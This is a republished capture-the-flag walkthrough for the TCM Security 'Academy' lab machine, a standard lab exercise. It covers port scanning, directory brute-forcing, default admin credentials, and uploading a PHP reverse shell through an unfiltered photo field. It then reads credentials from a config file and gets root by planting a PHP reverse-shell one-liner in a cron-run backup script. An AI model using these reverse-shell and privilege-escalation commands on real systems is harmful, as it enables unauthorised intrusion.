# :game_die: Writeup Academy Tcm Security By Dollarboysushil 68Ed47502Db7

> **Original Source:** [Writeup Academy Tcm Security By Dollarboysushil 68Ed47502Db7](https://infosecwriteups.com/writeup-academy-tcm-security-by-dollarboysushil-68ed47502db7)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Victim’s IP ; `192.168.21.134` IP may/will be different in your case

### Nmap


lets runs nmap to view the running ports in the machine.


`nmap -sC -sV {IP} -oN nmap`
here `-sC` flag runs default script
`-sV` flag runs version detection
and `-oN` is saving the result in nmap file


We have open ports:
`21 `— vsftpd 3.0.3
`22` — OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
`80 `— http Apache httpd 2.4.38 ((Debian))

### Lets look into port 80 HTTP


We have a default apache website running on port 80. Nothing much here.
So next best idea is to `brute force directories` hoping to find any juicy directory if exist.

### Gobuster


`gobuster dir -u {ip} -w {wordlist}`
here flag `-u` is used to set the url and `-w` is used to set wordlist.


lets look at these directory.


inside `/academy` we have a loginpage for student. I tried logging with some credentials like `admin:root` `admin:admin` `root:toor` and so on . but nothing worked. Same for `/phpmyadmin`


So the next best idea would be to again use `gobsuter` to bruteforce directory under `/academy`


We found some interesting directories.


lets look at `/admin`


in `/admin` we are prompted to login. I again used default credentials and this time `admin:admin` worked


After login we can see lots of interesting thing. Lets go to `Manage student section`


Here we have an option to reset password, so reset the password and lets go to login portal of student and try to login.


student login portal is at `ip/academy` if you forgot.


after login, go to my profile section. Here we have an option to upload a photo.
I tried uploading `.php` file to see if there is any sort of filter, but there wasnt any filter which means we can upload any file.
so using this vulnerability we can upload a `php reverse shell` and setup `netcat listner` so that when the uploaded php file is uploaded we get shell access.


For this download php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell).
In the `[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)` we have to do some modification.


edit `$ip` field to your ip.
and changing `$port` field is optional. Remember the port you used.


Now save this `[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) `and upload.


Click on browse and upload the file. You must see Successfull message.


Now lets make netcat ready to listen.


Here use the same port you used in previous [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)


After your netcat is ready.
right click on profile and click reload image.


## Get dollarboysushil’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


This should make the website to stuck on infinitely loading.


Under netcat listener we have successful shell.
we are logged in as `www-data`


This user have no power , so our aim is to either escalate privilege to root, or pivot to next powerful user.


For this we will be using `linpeas` which stands for Linux privilege escalation.


to install linpeas in victim machine, use cmd `cd /tmp` to navigate to `tmp` directory .


cmd `wget [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s)h`


This should install linpeas.sh.


now use `chmod +x linpeas.sh` to make linpeas executable. And run linpeas using command `./linpeas.sh`


Wait until linpeas is done.


Looking at the result from the linpeas. There are mainly two items that are very interesting.


We can see intresting cronjob. The cron job `  * /home/backup.sh` means the script `/home/backup.sh` will be executed every minute.


And second thing i found is


linpeas is showing password user `/var/www/html/academy/includes/config.php`


Lets look at this config.php


And we have username and password.


lets try to ssh login with this username and password.


And it worked, we are now logged in as grimmie.


For the `backup.sh` file we found.
we can edit this file, inside this file we can add php one liner and setup the netcat to listen.


since this cronjob is executed every minute, we should get ourself a shell.


`nano backup.sh` opens backup.sh file with nano editor


remove previous code and add
`php -r ‘$sock=fsockopen(“{yourip}”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’`


you can find one liner reverse shell from [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) :


No save and exit.


Lets make netcat listner ready.


make sure to use same port as you used in php one liner.


wait for a minute , `backup.sh` file should run auto every minute


And we have root access.


Machine successfully rooted.

---

*Originally published on [Medium](https://infosecwriteups.com/writeup-academy-tcm-security-by-dollarboysushil-68ed47502db7). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
